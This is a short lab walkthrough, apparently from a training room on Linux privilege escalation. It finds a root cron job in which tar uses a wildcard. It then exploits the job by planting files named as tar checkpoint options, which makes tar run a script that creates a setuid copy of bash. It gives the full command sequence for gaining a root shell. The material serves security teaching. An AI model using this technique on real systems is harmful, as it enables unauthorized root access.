**Detection**

Linux VM

1. In command prompt type: 
   
```
cat /etc/crontab
```

![[Pasted image 20240602233108.png]]


2. From the output, notice the script “/usr/local/bin/compress.sh”

3. In command prompt type: 
   
```
cat /usr/local/bin/compress.sh
```

4. From the output, notice the wildcard (\*) used by ‘tar’.

**Exploitation**

Linux VM

1. In command prompt type:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```

2. 
   
```
touch /home/user/--checkpoint=1
```

3. 
   
```
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

4. Wait 1 minute for the Bash script to execute.

5. In command prompt type: 
   
```
/tmp/bash -p
```

6. In command prompt type: 
   
```
id
```

![[Pasted image 20240602233340.png]]


Answer the questions below

Click 'Completed' once you have successfully elevated the machine
